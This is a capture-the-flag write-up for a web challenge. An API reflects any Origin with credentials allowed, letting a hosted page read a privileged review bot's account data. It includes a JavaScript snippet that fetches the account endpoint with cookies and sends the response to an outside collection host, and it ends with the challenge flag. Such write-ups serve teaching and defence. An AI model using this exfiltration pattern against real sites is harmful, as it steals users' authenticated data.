---
title: "DataBridge"
event: "The Great CTF Debrief 2026"
series: "Standalone"
category: web
difficulty: hard
points: 400
status: solved
flag: "FLAG{c0rs-r3fl3ct3d-0r1g1n-th3ft}"
tags: [cors-misconfiguration, reflected-origin, credentialed-request, ssrf-bot]
---

# DataBridge

> **TL;DR:** The API reflected any `Origin` back in its CORS headers *and* allowed credentials; a hosted page fetched `/api/account` with cookies and leaked it, and submitting that link to the internal review bot made the more-privileged reviewer leak the real flag cross-origin.

## Background (for beginners)
- **CORS** controls which other websites' JavaScript may read responses from an API. Reflecting the request's `Origin` and setting `Allow-Credentials: true` means *any* site can make authenticated requests and read the result.
- Combined with cookie-based auth, a malicious page can silently read a victim's private API data in the victim's session.
- An **internal review bot** that opens submitted links turns this into theft of a *privileged* account's data.

## The Challenge
Log in as demo `guest`/`guest123`; `/api/account` returns a decoy `releaseToken` (`FAKE-FLAG{Try-Harder-Mate}`). DataBridge also has a "Share a link with our team" feature, and an internal automated reviewer (more privileged) opens submitted links while logged in. An attacker sandbox is provided to host pages.

## Key Insight 💡
The API echoes whatever `Origin` you send and allows credentialed requests, so a cross-origin page can read `/api/account` with the victim's cookies. The decoy only shows for guest — so aim the attack at the privileged review bot, whose `/api/account` holds the real flag.

## Solution
1. Log in as guest and see `/api/account` return the decoy token. *Why: confirms the data location and that guest sees only a decoy.*
2. Verify the API reflects an arbitrary `Origin` and sets `Allow-Credentials: true`. *Why: confirms the CORS misconfiguration enabling cross-origin credentialed reads.*
3. In the attacker sandbox, host a page that `fetch`es `/api/account` with credentials and posts the result to a collection endpoint. *Why: weaponises the misconfig to exfiltrate whoever opens the page.*
4. Submit the hosted link via "Share a link with our team". *Why: the privileged reviewer bot will open it while logged in.*
5. The reviewer's browser runs the script and leaks *its own* `/api/account` (the real flag) to the sandbox. *Why: the bot is privileged, so its account holds the real token.*

## Solver sketch (illustrative page)
```
fetch('https://databridge/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://sandbox/collect?d=' + encodeURIComponent(d)));
```

## Why It Worked (the vulnerability)
CORS reflected an arbitrary `Origin` with credentials allowed, so any origin could read authenticated API data; an internal link-review bot supplied a privileged victim. **Fix:** allowlist exact trusted origins (never reflect `Origin`), and don't combine `Allow-Credentials: true` with a wildcard/reflected origin.

## Flag
```
FLAG{c0rs-r3fl3ct3d-0r1g1n-th3ft}
```

## Takeaways
- Reflecting `Origin` + `Allow-Credentials: true` = any site can read authenticated responses.
- Link-review bots are high-value victims — point client-side attacks at them.
- Allowlist CORS origins explicitly; never echo the request's Origin for credentialed APIs.
